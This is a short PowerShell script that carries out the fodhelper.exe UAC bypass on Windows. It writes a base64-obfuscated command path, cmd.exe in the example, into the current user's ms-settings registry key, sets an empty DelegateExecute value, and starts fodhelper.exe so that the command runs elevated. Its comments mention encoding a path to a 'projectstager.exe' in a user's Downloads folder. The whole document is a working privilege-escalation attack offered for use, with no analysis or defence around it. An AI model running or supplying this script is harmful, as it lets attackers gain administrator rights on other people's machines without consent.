# Use this to encode the encoded path variable [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("c:\users\polly.lu\downloads\projectstager.exe")).  In this example it uses cmd.exe

 # Define the registry key path
$REG_KEY = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"

# Base64 encoded filename - you need to encode filename
$BASE64_ENCODED_PATH = "Yzpcd2luZG93c1xzeXN0ZW0zMlxjbWQuZXhl"

# Decode the base64 string to get the file path
$RUN123 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($BASE64_ENCODED_PATH))

# Pause for 2 seconds
Start-Sleep -Seconds 2

# Add the DelegateExecute registry value with an empty string
Set-ItemProperty -Path $REG_KEY -Name "DelegateExecute" -Value "" -Force

# Pause for 4 seconds
Start-Sleep -Seconds 4

# Add the command to run the decoded executable as the default command
Set-ItemProperty -Path $REG_KEY -Name "(Default)" -Value $RUN123 -Force

# Pause for 2 seconds
Start-Sleep -Seconds 1

# Execute fodhelper.exe, effectively running the command as admin
Start-Process "fodhelper.exe" 

[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("c:\users\polly.lu\downloads\projectstager.exe"))
